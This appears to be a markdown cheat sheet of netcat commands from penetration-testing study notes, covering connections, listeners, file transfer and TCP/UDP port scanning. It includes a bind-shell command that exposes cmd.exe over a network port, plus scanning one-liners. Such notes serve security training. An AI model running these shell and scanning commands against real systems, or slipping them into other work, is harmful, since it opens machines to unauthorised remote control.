# Netcat  

The swiss army knife of TCP and UDP network connections.  

Connect to a port as a client, '-n' is no DNS resolution and '-v' is verbose. Port is 110 (POP3).  

`nc -nv 192.168.1.2 110`  

Set up a listener on port 4444.  

`nc -lvnp 4444`  

### Transferring files with netcat.  

Set up the listener.  

`nc -lvnp 4444 > incoming.exe`  

Transferring the binary wget.exe to our above listener.  

`nc -nv 10.11.0.22 < /usr/share/windows-resources/binaries/wget.exe`  

Bind cmd.exe to netcat to access command prompt over the network.  

`nc -lvnp 4444 -e cmd.exe`  

Using netcat as a tcp port scanner to scan an ip range.  

`nc -nvv -w 1 -z 10.11.1.220 <ip>-<ip>`  

Using netcat as an udp port scanner to scan an ip range.  

`nc -nv -u -z -w 1 10.11.1.115 160-162`  

